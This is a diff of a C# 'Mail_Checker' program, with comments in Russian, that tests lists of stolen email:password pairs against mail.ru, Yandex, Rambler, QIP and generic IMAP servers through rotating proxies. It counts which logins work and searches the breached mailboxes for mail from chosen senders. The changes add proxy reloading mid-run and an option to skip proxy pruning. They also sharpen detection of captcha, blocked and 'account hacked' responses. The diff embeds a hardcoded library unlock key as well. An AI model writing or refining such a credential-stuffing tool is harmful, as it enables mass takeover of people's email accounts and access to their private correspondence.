@@ -6,8 +6,15 @@ using xNet.Net;
 using System.Collections.Generic;
 using Chilkat;
 
+//----удаление дубликатов
+//-----отключение проверки прокси
+//-------сохранение остатка полностью
+//-----исправлен чек мейл ру и рамблера и яндекса и квипа
+//-------интерфейс при обычном чеке на валид
+//-----возможность самому подгружать прокси
 
-
+//исправить яндекс чек писем
+//для яндекса и мейла фразы ошибок другие поставить, мультиязычные
 
 namespace Mail_Checker
 {
@@ -34,23 +41,26 @@ namespace Mail_Checker
         public ConcurrentStack<string> mails;
         ConcurrentQueue<ProxyStats> proxys;
         string[] querys;
+        bool proxyCheck = true;
+        List<Thread> threadsList;
 
 
         int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
         int threads, timeout;
         bool started = false;
 
-        public Checker(string[] mails, string[] proxys, string[] querys, int threads, int timeout)
+        public Checker(string[] mails, string[] proxys, string[] querys, int threads, int timeout, bool proxyCheck)
         {
             this.mails = new ConcurrentStack<string>(mails);
 
             this.proxys = new ConcurrentQueue<ProxyStats>();
+            this.proxyCheck = proxyCheck;
 
             for (int i = 0; i < proxys.Length; i++)
             {
                 this.proxys.Enqueue(new ProxyStats(proxys[i], 10));
             }
-            
+
 
             this.querys = querys;
             this.threads = threads;
@@ -58,15 +68,36 @@ namespace Mail_Checker
 
         }
 
+        public void AddProxys(string[] newProxys)
+        {
+
+            for (int i = 0; i < newProxys.Length; i++)
+            {
+                this.proxys.Enqueue(new ProxyStats(newProxys[i], 10));
+            }
+
+            while (workingThreads < threads)
+            {
+                Thread t = new Thread(new ThreadStart(Check));
+                t.Start();
+                threadsList.Add(t);
+            }
+
+        }
+
+
+
+
+
 
         public void Start()
         {
             started = true;
 
-            List<Thread> threadsList = new List<Thread>();
+            threadsList = new List<Thread>();
 
 
-            for (int i = 0; i < threads && i<1001; i++)
+            for (int i = 0; i < threads && i < 1001; i++)
             {
                 Thread t = new Thread(new ThreadStart(Check));
                 t.Start();
@@ -139,12 +170,12 @@ namespace Mail_Checker
                     errors++;
                     mails.Push(mailLine);
                     proxyLine.stats--;
-                    if (proxyLine.stats > 0) proxys.Enqueue(proxyLine);
+                    if (proxyLine.stats > 0 || !proxyCheck) proxys.Enqueue(proxyLine);
                 }
                 else if (error == CheckErrors.noError)
                 {
                     valid++;
-                    proxyLine.stats+=10;
+                    proxyLine.stats += 10;
                     proxys.Enqueue(proxyLine);
                 }
                 else if (error == CheckErrors.mailError)
@@ -161,13 +192,12 @@ namespace Mail_Checker
 
 
                 MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messages);
-                CheckState chState = new CheckState(mails.Count + workingThreads-1, proxys.Count + workingThreads-1, errors, valid, novalid, workingThreads);
+                CheckState chState = new CheckState(mails.Count + workingThreads - 1, proxys.Count + workingThreads - 1, errors, valid, novalid, workingThreads);
                 OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));
 
 
 
             }
-
 
 
             workingThreads--;
@@ -180,11 +210,13 @@ namespace Mail_Checker
             if (mail.Contains("@yandex.ru")) serv = "imap.yandex.ru";
 
             else if (mail.Contains("@mail.ru") || mail.Contains("@list.ru")
-            || mail.Contains("@inbox.ru") || mail.Contains("@bk.ru")) serv = "imap.mail.ru";
+            || mail.Contains("@inbox.ru") || mail.Contains("@bk.ru"))
+                serv = "imap.mail.ru";
 
             else if (mail.Contains("@rambler.ru") || mail.Contains("@lenta.ru") ||
                 mail.Contains("@autorambler.ru") || mail.Contains("@myrambler.ru") ||
-                mail.Contains("@ro.ru") || mail.Contains("@r0.ru")) serv = "imap.rambler.ru";
+                mail.Contains("@ro.ru") || mail.Contains("@r0.ru"))
+                serv = "imap.rambler.ru";
 
             else if (mail.Contains("@qip.ru") || mail.Contains("@pochta.ru") ||
                 mail.Contains("@fromru.com") || mail.Contains("@front.ru") ||
@@ -198,7 +230,8 @@ namespace Mail_Checker
                 mail.Contains("@5ballov.ru") || mail.Contains("@aeterna.ru") ||
                 mail.Contains("@ziza.ru") || mail.Contains("@memori.ru") ||
                 mail.Contains("@photofile.ru") || mail.Contains("@fotoplenka.ru") ||
-                mail.Contains("@pochta.com")) serv = "imap.qip.ru";
+                mail.Contains("@pochta.com"))
+                serv = "imap.qip.ru";
 
             else serv = mail.Split(new char[] { '@' })[1];
             return serv;
@@ -228,27 +261,26 @@ namespace Mail_Checker
                 xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
                 req1.Cookies = cookies;
-                req1.ConnectTimeout = timeout*1000;
+                req1.ConnectTimeout = timeout * 1000;
                 req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
 
                 xNet.Net.HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
-                    "Login="+loginDomain[0]+"&Domain="+loginDomain[1]+"&Password="+mailElements[1]+"&saveauth=1&new_auth_form=1",
+                    "Login=" + loginDomain[0] + "&Domain=" + loginDomain[1] + "&Password=" + mailElements[1] + "&saveauth=1&new_auth_form=1",
                     "application/x-www-form-urlencoded");
 
                 string res1str = res1.ToString();
 
 
-                if (res1str.Contains("&captcha=1") || res1str.Contains("Ваш ящик заблокирован"))
+
+
+                if (res1str.Contains("&captcha=1") || res1str.Contains("Ваш ящик заблокирован")
+                    || res1str.Contains("&fail=1") || res1str.Contains("Восстановление доступа к ящику") ||
+                    res1str.Contains("мы запретили восстановление пароля с данной версии"))
                 {
                     error = CheckErrors.mailError;
                     return;
                 }
-                else if (res1str.Contains("&fail=1"))
-                {
-                    error = CheckErrors.mailError;
-                    return;
-                }
-                else if (!res1str.Contains("window.location.replace(\"https://m.mail.ru"))
+                else if (!res1str.Contains("m.mail.ru/messages"))
                 {
                     error = CheckErrors.proxyError;
                     return;
@@ -289,7 +321,7 @@ namespace Mail_Checker
                             messages[i] += Convert.ToInt32(foundStr);
                         }
 
-                        
+
 
                     }
                 }
@@ -341,12 +373,10 @@ namespace Mail_Checker
                 string res1str = res1.ToString();
 
 
-                if (res1str.Contains("Ошибка проверки контрольных символов"))
-                {
-                    error = CheckErrors.mailError;
-                    return;
-                }
-                else if (res1str.Contains("Ваш аккаунт временно заблокирован") || res1str.Contains("Неправильная пара логин-пароль") || res1str.Contains("записи с таким логином не существует"))
+                if (res1str.Contains("account_hacked_phone") ||
+                    res1str.Contains("восстановление доступа к логину") || res1str.Contains("Ваш логин заблокирован") ||
+                    res1str.Contains("domik-error-captcha") || res1str.Contains("account_hacked_no_phone") || 
+                    res1str.Contains("Неправильная пара логин-пароль") || res1str.Contains("записи с таким логином не существует"))
                 {
                     error = CheckErrors.mailError;
                     return;
@@ -383,7 +413,7 @@ namespace Mail_Checker
                         error = CheckErrors.proxyError;
                         return;
                     }
-                    else if (res2str=="")
+                    else if (res2str == "")
                     {
                         throw new NotImplementedException();
                     }
@@ -427,36 +457,47 @@ namespace Mail_Checker
             imap.Ssl = true;
             imap.Port = 993;
             imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
-            
+
 
             imap.HttpProxyHostname = proxyElements[0];
             imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
 
 
             success = imap.Connect(serv);
-
-
+            if (!success) error = CheckErrors.proxyError;
 
             if (success == true)
             {
                 success = imap.Login(mailElements[0], mailElements[1]);
-            }
-            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
 
-            Mailboxes mboxes = null;
+                if (!success)
+                {
+                    if (imap.LastResponse.Contains("Incorrect username") || imap.LastResponse.Contains("Account blocked")) error = CheckErrors.mailError;
+                    else if (imap.LastResponse == "") error = CheckErrors.proxyError;
+                    else error = CheckErrors.proxyError;
+                }
+            }
+
             if (success == true)
             {
                 if (querys.Length > 0)
                 {
+                    Mailboxes mboxes = null;
                     mboxes = imap.ListMailboxes("", "");
+                    if (mboxes == null)
+                    {
+                        success = false;
+                        error = CheckErrors.proxyError;
+                    }
 
 
-                    if (mboxes != null)
+                    if (success)
                     {
                         for (int i = 0; i < mboxes.Count; i++)
                         {
                             string mboxName = mboxes.GetName(i);
                             if (mboxName == "DraftBox" || mboxName == "SentBox" || mboxName == "Spam" || mboxName == "Draft" || mboxName == "Sent") continue;
+
                             success = imap.SelectMailbox(mboxName);
                             if (!success)
                             {
@@ -464,38 +505,36 @@ namespace Mail_Checker
                                 break;
                             }
 
+
                             for (int k = 0; k < querys.Length; k++)
                             {
                                 MessageSet messageSet = imap.Search("FROM " + querys[k], false);
-
-                                if (messageSet != null) messages[k] += messageSet.Count;
-                                else if (error == CheckErrors.noError)
+                                if (messageSet == null)
                                 {
-                                    messages[k] = 0;
+                                    success = false;
                                     error = CheckErrors.proxyError;
-                                    i += mboxes.Count;
+                                    i = mboxes.Count + 1; //выход из внешнего цикла
                                     break;
                                 }
+
+                                messages[k] += messageSet.Count;
                             }
 
                         }
                     }
-                    else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
-                }
-            }
-            else if (error == CheckErrors.noError && imap.LastResponse == "") error = CheckErrors.mailError;
-            else if (error == CheckErrors.noError) error = CheckErrors.mailError;
 
+
+
+                }
+
+
+            }
 
 
             imap.Disconnect();
             imap.Dispose();
 
-
-
         }
-
-
 
 
 
